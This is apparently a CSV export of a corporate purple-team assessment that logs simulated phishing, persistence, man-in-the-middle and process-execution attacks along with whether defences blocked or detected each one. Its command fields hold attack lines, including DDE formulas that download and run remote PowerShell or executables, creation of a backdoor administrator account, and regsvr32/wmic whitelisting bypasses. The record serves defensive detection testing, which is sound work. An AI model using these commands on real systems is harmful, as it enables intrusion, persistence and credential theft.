AssessmentGroup,Campaign,Phase,Variant,MitreID,CapecId,Method,Status,Outcome,Alert Severity,Alert Triggered,Activity Logged,Outcome Notes,Detection Recommendations,SourceIps,TargetAssets,ExpectedDetectionLayers,DetectingTools,Start Time,Start Time Epoch,Stop Time,Stop Time Epoch,Detection Time,Detection Time Epoch,Organizations,Tags,Objective,Command,References,Liklihood,Risk,Internal/External,Stealth,Attack Vector,Attack Complexity,Privileges Required,Attacker Tools
Enterprise Purple – 2017 Q3,Email With Malicious Attachments,Delivery,1 - Macro - Cobalt Strike Standard,T1566.001,,Phishing Payload,Completed,Blocked,TBD,No,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Lemmings,2017-08-05T02:48:34.460Z,1501901314460,2017-08-05T03:47:06.460Z,1501904826460,2017-08-05T05:21:26.460Z,1501910486460,Security Risk Advisors,,Send phishing email to victim containing link with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"Attacks --> Packages --> MS Office Macro
Copy code to office document",,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2017 Q3,Email With Malicious Attachments,Delivery,14 - Macro - Remote Template,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-08-05T14:45:01.460Z,1501944301460,2017-08-05T16:12:17.460Z,1501949537460,2017-08-05T17:13:06.460Z,1501953186460,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"Create a Word document, add the macro, then save as a .dotm 

Host the template

Create a new document and link the hosted template to it 
(Developer -> Document Template -> Document Template Url)",,Low,Low,External,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2017 Q3,Email With Malicious Attachments,Delivery,3 - Macro - Cobalt Strike Standard as HREF (URL Rewrite Update),T1566.001,,Phishing Payload,Completed,Blocked,TBD,No,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Lemmings,2017-08-06T10:13:10.460Z,1502014390460,2017-08-06T10:32:15.460Z,1502015535460,2017-08-06T12:04:23.460Z,1502021063460,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,,,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2017 Q3,Email With Malicious Attachments,Delivery,8 - Macro - MMG WMI PowerShell,T1566.001,,Phishing Payload,Completed,Blocked,TBD,TBD,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Lemmings,2017-08-07T03:14:58.460Z,1502075698460,2017-08-07T04:45:12.460Z,1502081112460,2017-08-07T04:57:19.460Z,1502081839460,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,python MMG.py [config] [output],,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2017 Q3,Email With Malicious Attachments,Delivery,16 - Archive - DDE,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-08-05T17:50:35.460Z,1501955435460,2017-08-05T19:01:29.460Z,1501959689460,2017-08-05T20:57:12.460Z,1501966632460,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Zip the dde office document,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q3,Email With Malicious Attachments,Delivery,18 - Encrypted Archive - Macro,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-08-05T21:34:54.460Z,1501968894460,2017-08-05T22:21:27.460Z,1501971687460,2017-08-05T23:09:03.460Z,1501974543460,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Zip or rar and encrypt malicious document,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q3,Email With Malicious Attachments,Delivery,13 - DDE - Exe,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-08-07T12:21:07.460Z,1502108467460,2017-08-07T13:46:14.460Z,1502113574460,2017-08-07T13:47:08.460Z,1502113628460,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,=cmd|'/c certutil https://<exe url> <local file location> && <local file location> && del <local file location>'!A1,,Low,Low,External,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2017 Q3,Email With Malicious Attachments,Delivery,2 - Macro - CobaltStrike Standard (MMG),T1566.001,,Phishing Payload,Completed,Blocked,TBD,No,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Lemmings,2017-08-05T06:16:15.460Z,1501913775460,2017-08-05T08:10:11.460Z,1501920611460,2017-08-05T09:57:03.460Z,1501927023460,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,python MMG.py [config] [output],,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2017 Q3,Email With Malicious Attachments,Delivery,9 - Macro - LuckyStrike PowerShell CellEmbed,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-08-07T05:11:06.460Z,1502082666460,2017-08-07T05:59:37.460Z,1502085577460,2017-08-07T07:36:55.460Z,1502091415460,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"Run as admin:
.\luckystrike.ps1

Catalog Options -> Add Payload to Catalog (Name is required, everything else can be skipped) -> Powershell Script

Main Menu -> Payload Options -> xls  -> Cell Embedded

File Options -> File options -> Payload options  -> Generate New File",,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2017 Q3,Email With Malicious Attachments,Delivery,11 - DDE - PowerShell,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-08-05T10:30:31.460Z,1501929031460,2017-08-05T11:43:35.460Z,1501933415460,2017-08-05T13:30:31.460Z,1501939831460,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"=cmd|'/c powershell -Exec ByPass -nop -noexit -c IEX ((New-Object Net.WebClient).DownloadString(\""http://<location of payload>\""))'!A1",,Low,Low,External,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2017 Q3,Email With Malicious Attachments,Delivery,22 - Link Inside Office Document,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-08-06T07:18:11.460Z,1502003891460,2017-08-06T08:23:28.460Z,1502007808460,2017-08-06T09:48:21.460Z,1502012901460,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Send a office document with a malicious link in it,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q3,Email With Malicious Attachments,Delivery,15 - Archive - Macro,T1566.001,,Phishing Payload,Completed,Blocked,TBD,No,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Lemmings,2017-08-07T14:11:25.460Z,1502115085460,2017-08-07T14:46:35.460Z,1502117195460,2017-08-07T16:20:42.460Z,1502122842460,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Zip or rar malicious document and send using email,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q3,Email With Malicious Attachments,Delivery,4 - Macro - Cobalt Strike Standard (URL Rewrite Update),T1566.001,,Phishing Payload,Completed,Blocked,TBD,TBD,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Lemmings,2017-08-06T13:03:01.460Z,1502024581460,2017-08-06T14:11:08.460Z,1502028668460,2017-08-06T15:32:14.460Z,1502033534460,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,,,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2017 Q3,Email With Malicious Attachments,Delivery,19 - Encrypted Archive - DDE,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-08-06T00:12:08.460Z,1501978328460,2017-08-06T00:41:25.460Z,1501980085460,2017-08-06T00:54:37.460Z,1501980877460,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Zip and encrypt the dde office document,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q3,Email With Malicious Attachments,Delivery,7 - Macro - WScript PowerShell XOR,T1566.001,,Phishing Payload,Completed,Blocked,TBD,TBD,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Lemmings,2017-08-07T01:07:15.460Z,1502068035460,2017-08-07T01:31:31.460Z,1502069491460,2017-08-07T01:35:43.460Z,1502069743460,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Copy macro template into office document,,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2017 Q3,Email With Malicious Attachments,Delivery,12 - Macro - MMG WMI Exe,T1566.001,,Phishing Payload,Completed,Blocked,TBD,No,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Lemmings,2017-08-07T09:21:33.460Z,1502097693460,2017-08-07T11:07:51.460Z,1502104071460,2017-08-07T11:55:22.460Z,1502106922460,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,python MMG.py [config] [output],,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2017 Q3,Email With Malicious Attachments,Delivery,10 - Macro - MSBuild,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-08-06T18:38:47.460Z,1502044727460,2017-08-06T20:24:36.460Z,1502051076460,2017-08-06T21:31:49.460Z,1502055109460,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe <MALICIOUS_FILE>,,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2017 Q3,Email With Malicious Attachments,Delivery,21 - Link Inside PDF,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-08-06T03:25:47.460Z,1501989947460,2017-08-06T04:06:26.460Z,1501992386460,2017-08-06T05:38:30.460Z,1501997910460,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Create a PDF with a malicious link in it and send using email,,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q3,Email With Malicious Attachments,Delivery,5 - Macro - WScript PowerShell,T1566.001,,Phishing Payload,Completed,Blocked,TBD,No,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,Lemmings,2017-08-06T17:28:33.460Z,1502040513460,2017-08-06T17:38:25.460Z,1502041105460,2017-08-06T18:32:12.460Z,1502044332460,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,Copy macro template into office document,,Low,Low,External,Low,,,,"Manual Techniques,Cobalt Strike"
Enterprise Purple – 2017 Q3,Email With Malicious Attachments,Delivery,17 - Macro - LuckyStrike PowerShell CellEmbed + Sandbox Evasion,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,TBD,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-08-07T16:25:46.460Z,1502123146460,2017-08-07T17:10:33.460Z,1502125833460,2017-08-07T19:06:04.460Z,1502132764460,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious document.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"Run as admin:
.\luckystrike.ps1

Catalog Options -> Add Payload to Catalog (Name is required, everything else can be skipped) -> Powershell Script

Main Menu -> Payload Options -> xls  -> Cell Embedded

File Options -> File options -> Payload options  -> Generate New File",,Low,Low,External,Low,,,,Cobalt Strike
Enterprise Purple – 2017 Q3,Email With Malicious Attachments,Delivery,20 - Password-protected Office Doc - Standard CS payload,T1566.001,,Phishing Payload,Completed,NotDetected,TBD,TBD,Yes,,1) Malicious email delivery alerted by email gateway (ideally blocked/quarantined too with attachment stripped and URLs rewritten),,,Email Gateway,,2017-08-06T01:11:54.460Z,1501981914460,2017-08-06T02:39:33.460Z,1501987173460,2017-08-06T03:13:04.460Z,1501989184460,Security Risk Advisors,,Send phishing email to victim containing attachment with malicious link.  This is intended to test the mail gateway (and sandbox analysis) in isolation.,"Generate standard office payload using cobalt strike from Attacks -> Packages -> MS Office Macro

When saving the malicious macro, encrypt the document with a password by: Save -> Info -> Protect Document -> Encrypt With Password",,Low,Low,External,Low,,,,Manual Techniques
Enterprise Purple – 2017 Q3,Endpoint Persistence,Persistence,Use of common Run keys to maintain persistence,T1547.001,,Registry Modification,Completed,Blocked,TBD,No,TBD,,1) EDR and/or SIEM rules are configured to detect Windows registry modifications,,,"SIEM,EDR,Endpoint Protection",Donpachi,2017-08-14T08:33:44.460Z,1502699624460,2017-08-14T10:22:51.460Z,1502706171460,2017-08-14T11:56:22.460Z,1502711782460,Security Risk Advisors,,"Run a payload during user login and startup, attempt to connect back to C2 server over TCP or UDP channels.",,,Medium,High,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2017 Q3,Endpoint Persistence,Persistence,Create a Local Administrator User on Server,T1136,,Backdoor Accounts,Completed,Detected,High,TBD,Yes,,"1) EDR tool alerts on suspicious use of Windows 'net user' and similar commands,2) SIEM alerts on local and domain user and group creation and modifications",,,"SIEM,EDR",Progear,2017-08-14T21:51:39.460Z,1502747499460,2017-08-14T22:54:18.460Z,1502751258460,2019-01-28T16:34:32.994Z,1548693272994,Security Risk Advisors,,Create a Local administrator user after the compromise of a system.,"net user /add [username] [password]
new localgroup administrators [username] /add",,Medium,High,Internal,Low,,,,
Enterprise Purple – 2017 Q3,Endpoint Persistence,Persistence,Use of schtasks.exe for persistent jobs,T1053,,Scheduled tasks,Completed,Detected,Med,TBD,No,,1) EDR and/or SIEM rules are configured to detect Windows task scheduler events,,,"SIEM,EDR,Endpoint Protection",Progear,2017-08-14T18:14:20.460Z,1502734460460,2017-08-14T19:53:54.460Z,1502740434460,2019-01-28T16:29:11.191Z,1548692951191,Security Risk Advisors,,Create a scheduled task,"schtasks /Create /SC DAILY /TN ""Malicious Task"" /TR ""C:MaliciousFile.bat"" /ST 09:00",,Medium,Medium,Internal,Medium,,,,Native Windows Commands
Enterprise Purple – 2017 Q3,Endpoint Persistence,Persistence,Use of WMI Subscription for persistent jobs,T1546.003,,Windows Management Instrumentation,Completed,NotDetected,TBD,TBD,No,,1) EDR and/or SIEM rules are configured to detect suspicious WMI execution,,,"SIEM,EDR,Endpoint Protection",,2017-08-15T00:43:43.460Z,1502757823460,2017-08-15T02:06:27.460Z,1502762787460,2017-08-15T03:52:24.460Z,1502769144460,Security Risk Advisors,,Establish persistence using WMI event subscriptions.,"Create a one liner payload
cat payload.txt | iconv --to-code=UTF-16LE | base64 -w 0

Red team → Persistence → WMI Event Persistence using PowerShell",https://github.com/harleyQu1nn/AggressorScripts/tree/master/Persistence,Medium,Medium,Internal,Medium,,,,"Native Windows Commands,Cobalt Strike"
Enterprise Purple – 2017 Q3,Endpoint Persistence,Persistence,Use of common Run keys to maintain persistence using .BAT file,T1547.001,,Registry Modification,Completed,Blocked,TBD,No,TBD,,1) EDR and/or SIEM rules are configured to detect Windows registry modifications,,,"SIEM,EDR,Endpoint Protection",Donpachi,2017-08-14T13:46:46.460Z,1502718406460,2017-08-14T14:48:11.460Z,1502722091460,2017-08-14T16:46:31.460Z,1502729191460,Security Risk Advisors,,"Run a payload during user login and startup, attempt to connect back to C2 server over TCP or UDP channels.",,,Medium,High,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2017 Q3,Endpoint Persistence,Persistence,Use of sc.exe to create rogue service to maintain access,T1543.003,,Rogue Service Creation,Completed,Detected,Med,TBD,No,,1) EDR and/or SIEM rules are configured to detect Windows service creation events,,,"SIEM,EDR,Endpoint Protection",Progear,2017-08-14T06:51:55.460Z,1502693515460,2017-08-14T08:18:58.460Z,1502698738460,2019-01-28T16:32:50.653Z,1548693170653,Security Risk Advisors,,Modification of the registry startup keys to launch a rogue service.,,,Low,Medium,Internal,Medium,,,,Native Windows Commands
Enterprise Purple – 2017 Q3,Malware Profile Simulation,Exploitation,Malleable C2 Profile Using Cobalt Strike - MALWARE PROFILE 3,T1095,,Malware simulation,Completed,NotDetected,TBD,TBD,Yes,,1) Simulated malware network traffic detected by behavioral analytics or firewall gateway,,,,,2017-08-21T20:37:31.460Z,1503347851460,2017-08-21T20:47:28.460Z,1503348448460,2017-08-21T22:24:07.460Z,1503354247460,Security Risk Advisors,,Startup Cobalt Strike to simulate known malware network profile.,"https://github.com/rsmudge/Malleable-C2-Profiles
./teamserver [external IP] [password] [/path/to/my.profile]",,High,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2017 Q3,Malware Profile Simulation,Exploitation,Malleable C2 Profile Using Cobalt Strike - MALWARE PROFILE 1,T1095,,Malware simulation,Completed,NotDetected,TBD,TBD,Yes,,1) Simulated malware network traffic detected by behavioral analytics or firewall gateway,,,,,2017-08-21T15:32:48.460Z,1503329568460,2017-08-21T17:00:16.460Z,1503334816460,2017-08-21T17:24:33.460Z,1503336273460,Security Risk Advisors,,Startup Cobalt Strike to simulate known malware network profile.,"https://github.com/rsmudge/Malleable-C2-Profiles
./teamserver [external IP] [password] [/path/to/my.profile]",,High,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2017 Q3,Malware Profile Simulation,Exploitation,Malleable C2 Profile Using Cobalt Strike - MALWARE PROFILE 4,T1095,,Malware simulation,Completed,NotDetected,TBD,TBD,Yes,,1) Simulated malware network traffic detected by behavioral analytics or firewall gateway,,,,,2017-08-22T00:04:25.460Z,1503360265460,2017-08-22T01:08:25.460Z,1503364105460,2017-08-22T02:12:45.460Z,1503367965460,Security Risk Advisors,,Startup Cobalt Strike to simulate known malware network profile.,"https://github.com/rsmudge/Malleable-C2-Profiles
./teamserver [external IP] [password] [/path/to/my.profile]",,High,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2017 Q3,Malware Profile Simulation,Exploitation,Files with Ransomware Extensions #2,,,Ransomware,Completed,NotDetected,TBD,TBD,No,,,,,EDR,,2017-08-22T06:34:47.460Z,1503383687460,2017-08-22T06:49:15.460Z,1503384555460,2017-08-22T07:12:02.460Z,1503385922460,Security Risk Advisors,,"Generate a large number of files with a ransomware extension

extension:
- kratos","ps> 1..100 | %{new-item -type file -path ""$_.extension""}",,High,High,Both,Low,,,,
Enterprise Purple – 2017 Q3,Malware Profile Simulation,Exploitation,Files with Ransomware Extensions #1,,,Ransomware,Completed,Detected,High,TBD,TBD,,,,,"EDR,Endpoint Protection",Donpachi,2017-08-22T02:43:30.460Z,1503369810460,2017-08-22T04:35:00.460Z,1503376500460,2017-08-22T05:08:18.460Z,1503378498460,Security Risk Advisors,,"Generate a large number of files with a ransomware extension

extensions:
- locky
- ykcol","ps> 1..100 | %{new-item -type file -path ""$_.extension""}",,High,High,Both,Low,,,,
Enterprise Purple – 2017 Q3,Malware Profile Simulation,Exploitation,Malleable C2 Profile Using Cobalt Strike - MALWARE PROFILE 2,T1095,,Malware simulation,Completed,NotDetected,TBD,TBD,Yes,,1) Simulated malware network traffic detected by behavioral analytics or firewall gateway,,,,,2017-08-21T17:42:20.460Z,1503337340460,2017-08-21T19:03:42.460Z,1503342222460,2017-08-21T19:49:54.460Z,1503344994460,Security Risk Advisors,,Startup Cobalt Strike to simulate known malware network profile.,"https://github.com/rsmudge/Malleable-C2-Profiles
./teamserver [external IP] [password] [/path/to/my.profile]",,High,High,Both,Medium,,,,Cobalt Strike
Enterprise Purple – 2017 Q3,Network MiTM,Exploitation,Inveigh,T1557.001,,Network Spoofing,Completed,NotDetected,TBD,TBD,No,,1) Rogue device triggers alert from NAC solution or potential UEBA tool when broadcasting lots of traffic.,,,"Network Isolation,Secure Baselines,Behavior Analytics",,2017-08-17T01:41:58.460Z,1502934118460,2017-08-17T02:57:06.460Z,1502938626460,2017-08-17T03:48:09.460Z,1502941689460,Security Risk Advisors,,Run the powershell inveigh toolset via a beacon.,Invoke-Inveigh  NBNS - Y,,Low,Low,Internal,Low,,,,
Enterprise Purple – 2017 Q3,Network MiTM,Exploitation,Basic Auth & WPAD,T1040,,Network spoofing,Completed,Blocked,TBD,No,TBD,,1) Rogue device triggers alert from NAC solution or potential UEBA tool when broadcasting lots of traffic.,,,"Network Isolation,Secure Baselines,Behavior Analytics",Secure Configs,2017-08-17T04:45:04.460Z,1502945104460,2017-08-17T05:32:04.460Z,1502947924460,2017-08-17T07:14:39.460Z,1502954079460,Security Risk Advisors,,"Respond to local network queries for systems over LLMNR and NetBIOS, obtain domain user password hashes and clear text credentials",,,High,High,Internal,Medium,,,,Responder
Enterprise Purple – 2017 Q3,Network MiTM,Exploitation,Unencrypted Windows Update,T1040,,Network spoofing,Completed,Blocked,TBD,No,TBD,,,,,Secure Baselines,Secure Configs,2017-08-16T19:56:00.460Z,1502913360460,2017-08-16T21:08:15.460Z,1502917695460,2017-08-16T22:09:59.460Z,1502921399460,Security Risk Advisors,,Intercept Windows Updates on the target laptop in order to run a malicious binary,./wsuxploit.sh <TARGET_IP> <WSUS_IP> <WSUS_PORT> <BINARY_PATH>,,High,High,Internal,Medium,,,,
Enterprise Purple – 2017 Q3,Network MiTM,Exploitation,LLMNR,T1557.001,,Network spoofing,Completed,NotDetected,TBD,TBD,No,,1) Rogue device triggers alert from NAC solution or potential UEBA tool when broadcasting lots of traffic.,,,"Network Isolation,Secure Baselines,Behavior Analytics",,2017-08-16T23:02:51.460Z,1502924571460,2017-08-16T23:18:38.460Z,1502925518460,2017-08-17T00:02:17.460Z,1502928137460,Security Risk Advisors,,"Respond to local network queries for systems over LLMNR and NetBIOS, obtain domain user password hashes and clear text credentials.",,,High,High,Internal,Medium,,,,Responder
Enterprise Purple – 2017 Q3,Suspicious Process Execution,Exploitation,Obfuscated Commands - CMD,T1059.004,,Trusted Windows Binary,Completed,NotDetected,TBD,TBD,No,,,,,EDR,,2017-08-13T21:50:42.460Z,1502661042460,2017-08-13T21:56:12.460Z,1502661372460,2017-08-13T22:11:39.460Z,1502662299460,Security Risk Advisors,,Run an obfuscated CMD command to run a malicious command.,invoke-dosfuscation -> run command,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2017 Q3,Suspicious Process Execution,Exploitation,Process Creation Using PowerShell,T1059.001,,Trusted Windows Binary,Completed,Detected,Med,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR",Progear,2017-08-13T02:32:40.460Z,1502591560460,2017-08-13T04:19:29.460Z,1502597969460,2019-01-28T16:26:12.640Z,1548692772640,Security Risk Advisors,,Spawn a new process using PowerShell.,powershell.exe <run command>,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2017 Q3,Suspicious Process Execution,Exploitation,Process Creation Using Regsvr32,T1218.010,,Trusted Windows Binary,Completed,Blocked,TBD,No,TBD,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR,Endpoint Protection",Donpachi,2017-08-12T22:35:27.460Z,1502577327460,2017-08-12T23:25:10.460Z,1502580310460,2017-08-13T01:12:24.460Z,1502586744460,Security Risk Advisors,,Spawn a new process to bypass application whitelisting controls with Regsvr32 (Squiblydoo).,regsvr32 /s /n /u /i:<path to scriptlet> scrobj.dll,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2017 Q3,Suspicious Process Execution,Exploitation,PowerShell Downgrade,T1059.001,,Trusted Windows Binary,Completed,Detected,Med,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR",Progear,2017-08-13T23:37:44.460Z,1502667464460,2017-08-14T00:33:08.460Z,1502670788460,2019-01-28T16:26:41.131Z,1548692801131,Security Risk Advisors,,Execute PowerShell in a degraded version to avoid security controls in newer versions.,powershell.exe -v 2,,Low,Low,Internal,Low,,,,PowerShell
Enterprise Purple – 2017 Q3,Suspicious Process Execution,Exploitation,Process Creation Using JS,T1059.004,,Trusted Windows Binary,Completed,NotDetected,TBD,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR",,2017-08-13T09:52:11.460Z,1502617931460,2017-08-13T11:38:35.460Z,1502624315460,2017-08-13T12:45:29.460Z,1502628329460,Security Risk Advisors,,Spawn a new process using JS.,cscript <path to js file>,,Low,Low,Internal,Low,,,,Native Windows Commands
Enterprise Purple – 2017 Q3,Suspicious Process Execution,Exploitation,Process Creation Using WMI Format Table,T1047,,Trusted Windows Binary,Completed,NotDetected,TBD,TBD,No,,"1) Suspicious process execution is detected by EDR or other endpoint security tool, or alerted in SIEM based on Windows or sysmon event IDs",,,"SIEM,EDR",,2017-08-14T03:49:55.460Z,1502682595460,2017-08-14T05:43:26.460Z,1502689406460,2017-08-14T06:51:45.460Z,1502693505460,Security Risk Advisors,,Spawn a new process to bypass application whitelisting controls with WMI Format Table (Squiblytoo).,wmic os get /format:<url to xsl file>,,Low,Low,Internal,Low,,,,Native Windows Commands
